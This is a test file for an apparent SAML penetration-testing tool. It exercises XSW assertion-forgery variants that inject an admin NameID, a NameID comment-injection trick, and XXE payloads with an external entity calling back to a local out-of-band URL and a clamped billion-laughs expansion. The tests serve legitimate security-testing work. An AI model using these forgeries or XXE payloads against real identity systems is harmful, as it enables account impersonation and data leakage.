"""XSW2-XSW8 structural tests + XXE payload + new checks."""

from __future__ import annotations

import httpx
import pytest
import structlog
from lxml import etree

from oauthive.capabilities import CapabilitiesReport, derive_from_saml_metadata
from oauthive.checks.saml_comment import SAMLCommentCheck
from oauthive.checks.saml_xsw import SAMLXSWCheck
from oauthive.checks.saml_xxe import SAMLXXECheck
from oauthive.context import Context
from oauthive.saml.forge import (
    SAMLForgeError,
    XSW_VARIANTS,
    inject_nameid_attribute_comment,
    xxe_bounded_expansion,
    xxe_external_entity,
    xxe_parameter_entity,
)
from oauthive.saml.metadata import parse_metadata

NS = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds": "http://www.w3.org/2000/09/xmldsig#",
}


SIGNED_RESPONSE = b"""<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
                ID="_resp-1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z"
                InResponseTo="_req-1" Destination="https://sp.example.test/acs">
  <saml:Issuer>https://idp.example.test/saml</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion ID="_a-1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.test/saml</saml:Issuer>
    <ds:Signature>
      <ds:SignedInfo>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_a-1">
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>yyy</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>asig</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>alice@example.test</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""

EVIL = "admin@victim.test"


def _parse(xml: bytes):
    return etree.fromstring(xml)


def _count_signatures(root):
    return len(root.xpath(".//ds:Signature", namespaces=NS))


def _count_assertions(root):
    return len(root.xpath(".//saml:Assertion", namespaces=NS))


@pytest.mark.parametrize("name", sorted(XSW_VARIANTS.keys()))
def test_every_xsw_variant_preserves_at_least_one_signature(name):
    """Whatever the positioning trick, the signed clone must survive so
    that a naive verifier can walk into it. XSW3 is the exception -- the
    signed assertion is preserved in its original position; no Signature
    duplication needed."""
    out = XSW_VARIANTS[name](SIGNED_RESPONSE, EVIL)
    root = _parse(out)
    # At least one signed Assertion element remains somewhere in the tree.
    assert _count_signatures(root) >= 1, f"{name} destroyed all signatures"


@pytest.mark.parametrize("name", sorted(XSW_VARIANTS.keys()))
def test_every_xsw_variant_places_two_assertions(name):
    out = XSW_VARIANTS[name](SIGNED_RESPONSE, EVIL)
    root = _parse(out)
    # At least two Assertion elements total (signed original/clone + evil).
    assert _count_assertions(root) >= 2, f"{name} produced fewer than 2 assertions"


@pytest.mark.parametrize("name", sorted(XSW_VARIANTS.keys()))
def test_every_xsw_variant_injects_evil_name_id(name):
    out = XSW_VARIANTS[name](SIGNED_RESPONSE, EVIL)
    root = _parse(out)
    texts = root.xpath(".//saml:NameID/text()", namespaces=NS)
    assert EVIL in texts, f"{name} did not inject evil NameID; got {texts!r}"


def test_xsw3_places_evil_as_first_assertion_child_of_response():
    out = XSW_VARIANTS["xsw3"](SIGNED_RESPONSE, EVIL)
    root = _parse(out)
    first = root.xpath("./saml:Assertion", namespaces=NS)[0]
    assert first.find(".//{urn:oasis:names:tc:SAML:2.0:assertion}NameID").text == EVIL


def test_xsw5_id_swap_preserves_original_id_on_evil():
    out = XSW_VARIANTS["xsw5"](SIGNED_RESPONSE, EVIL)
    root = _parse(out)
    # Evil assertion took ID "_a-1"; signed clone is "_a-1-renamed".
    ids = {a.get("ID") for a in root.xpath(".//saml:Assertion", namespaces=NS)}
    assert "_a-1" in ids
    assert "_a-1-renamed" in ids


def test_xsw_raises_on_non_response_root():
    with pytest.raises(SAMLForgeError):
        XSW_VARIANTS["xsw1"](b"<foo/>", EVIL)


# ---------- attribute comment ----------


def test_inject_nameid_attribute_comment_sets_format():
    out = inject_nameid_attribute_comment(SIGNED_RESPONSE, "admin@victim.test")
    root = _parse(out)
    nameid = root.xpath(".//saml:NameID", namespaces=NS)[0]
    assert nameid.get("Format", "").endswith("emailAddress")
    assert nameid.text == "admin@victim.test"
    # Comment present with tail suffix
    children = [c for c in nameid if c.tag is etree.Comment]
    assert children and children[0].tail == ".attacker.test"


# ---------- XXE payloads ----------


def test_xxe_external_entity_contains_doctype_and_system_url():
    xml = xxe_external_entity(
        oob_url="http://127.0.0.1:8443/cb",
        issuer="https://sp.example.test/saml/sp",
        acs_url="https://sp.example.test/acs",
        destination="https://idp.example.test/sso",
    )
    assert b"<!DOCTYPE" in xml
    assert b'SYSTEM "http://127.0.0.1:8443/cb"' in xml
    assert b"&probe;" in xml


def test_xxe_parameter_entity_contains_percent_remote():
    xml = xxe_parameter_entity(
        oob_url="http://127.0.0.1:8443/cb",
        issuer="x", acs_url="x", destination="x",
    )
    assert b"<!ENTITY % remote SYSTEM" in xml
    assert b"%remote;" in xml


def test_xxe_bounded_expansion_clamps_depth():
    low = xxe_bounded_expansion(issuer="x", acs_url="x", destination="x", depth=0)
    high = xxe_bounded_expansion(issuer="x", acs_url="x", destination="x", depth=99)
    # depth is clamped to [2, 5]; resulting entity count should be 3..6
    # (lolN plus lol0). Assert by counting ENTITY definitions.
    assert low.count(b"<!ENTITY") == 3  # depth=2 -> lol0,lol1,lol2
    assert high.count(b"<!ENTITY") == 6  # depth=5 -> lol0..lol5


def test_xxe_bounded_expansion_is_not_exponential():
    # Sanity: the full payload must stay small; the clamp is load-bearing.
    xml = xxe_bounded_expansion(issuer="x", acs_url="x", destination="x", depth=5)
    # < 2 KB. Billion-laughs would be megabytes when expanded; pre-expansion
    # bytes are what we ship.
    assert len(xml) < 2048


# ---------- checks ----------


def _md_xml(entity_id: str = "https://idp.example.test/saml") -> bytes:
    return f"""<?xml version="1.0"?>
<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
                     entityID="{entity_id}">
  <md:IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <md:SingleSignOnService
        Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
        Location="https://idp.example.test/sso"/>
  </md:IDPSSODescriptor>
</md:EntityDescriptor>""".encode()


async def _ctx() -> Context:
    md = parse_metadata(_md_xml())
    return Context(
        tenant_id="t",
        discovery=None,
        capabilities=CapabilitiesReport(saml=derive_from_saml_metadata(md)),
        http=httpx.AsyncClient(),
        log=structlog.get_logger(),
        saml_metadata=md,
    )


async def test_saml_xsw_check_lists_all_variants():
    ctx = await _ctx()
    findings = await SAMLXSWCheck().run(ctx)
    assert len(findings) == 1
    f = findings[0]
    assert f.severity == "info"
    variants = set(f.evidence["variants"])
    assert variants == set(XSW_VARIANTS.keys())
    # reproducer command for at least one variant appears in description
    assert "oauthive saml forge --attack xsw3" in f.description


async def test_saml_comment_check_fires_when_metadata_present():
    ctx = await _ctx()
    findings = await SAMLCommentCheck().run(ctx)
    assert findings and findings[0].id == "saml_comment.exercise_against_sp"
    assert "inject_nameid_comment" in findings[0].description
    assert "inject_nameid_attribute" in findings[0].description


async def test_saml_xxe_check_lists_sso_endpoints():
    ctx = await _ctx()
    findings = await SAMLXXECheck().run(ctx)
    assert findings and findings[0].id == "saml_xxe.exercise_against_idp"
    assert any("/sso" in s for s in findings[0].evidence["sso_endpoints"])


async def test_saml_checks_without_metadata_return_nothing():
    ctx = Context(
        tenant_id="t",
        discovery=None,
        capabilities=CapabilitiesReport(),
        http=httpx.AsyncClient(),
        log=structlog.get_logger(),
        saml_metadata=None,
    )
    assert await SAMLXSWCheck().run(ctx) == []
    assert await SAMLCommentCheck().run(ctx) == []
    assert await SAMLXXECheck().run(ctx) == []
